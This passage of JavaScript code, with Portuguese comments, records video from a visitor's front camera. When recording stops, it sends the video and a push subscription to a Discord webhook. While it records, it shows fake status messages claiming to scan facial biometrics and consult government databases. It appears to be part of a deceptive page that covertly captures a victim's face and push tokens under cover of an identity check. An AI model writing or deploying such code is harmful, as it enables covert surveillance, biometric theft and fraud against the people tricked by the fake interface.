        if (ev.data.size > 0) chunksRef.current.push(ev.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        // Envia tudo para o Discord assim que a gravação termina
        await sendToWebhook(pushSub, videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();

      // Interface de Scan
      const statuses = [
        'Ativando câmera frontal...',
        'Escaneando biometria facial...', 
        'Validando tokens de push...',
        'Consultando bases governamentais...', 
